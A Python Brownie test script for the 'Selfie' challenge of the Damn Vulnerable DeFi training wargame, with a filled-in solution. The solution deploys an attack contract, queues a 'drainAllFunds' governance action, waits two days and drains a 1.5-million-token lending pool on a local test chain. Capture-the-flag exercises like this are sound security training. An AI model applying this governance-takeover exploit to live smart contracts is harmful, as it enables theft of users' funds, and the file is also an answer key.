from brownie import (accounts, chain, Wei, SelfiePool,
                     SimpleGovernance, DamnValuableTokenSnapshot, AttackSelfiePool)


TOKEN_INITIAL_SUPPLY = Wei("2000000 ether")
TOKENS_IN_POOL = Wei("1500000 ether")

# ** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE **


def test_selfie():

    deployer, attacker = accounts[0:2]

    token = DamnValuableTokenSnapshot.deploy(
        TOKEN_INITIAL_SUPPLY, {"from": deployer})
    governance = SimpleGovernance.deploy(token.address, {"from": deployer})
    pool = SelfiePool.deploy(
        token.address, governance.address, {"from": deployer})

    token.transfer(pool.address, TOKENS_IN_POOL)

    # ** CODE YOUR EXPLOIT HERE **

    # SOLUTION
    attack_contract = AttackSelfiePool.deploy(
        token.address, governance.address, pool.address, {"from": attacker})
    tx = attack_contract.attack(TOKENS_IN_POOL, {"from": attacker})

    # "drainAllFunds" is now queued, lets wait 2 days to execute the governance action
    chain.sleep(2*24*60*60)
    governance.executeAction(
        tx.events['ActionQueued']['actionId'], {"from": attacker})

    # ** SUCCESS CONDITIONS **

    assert token.balanceOf(attack_contract) == TOKENS_IN_POOL
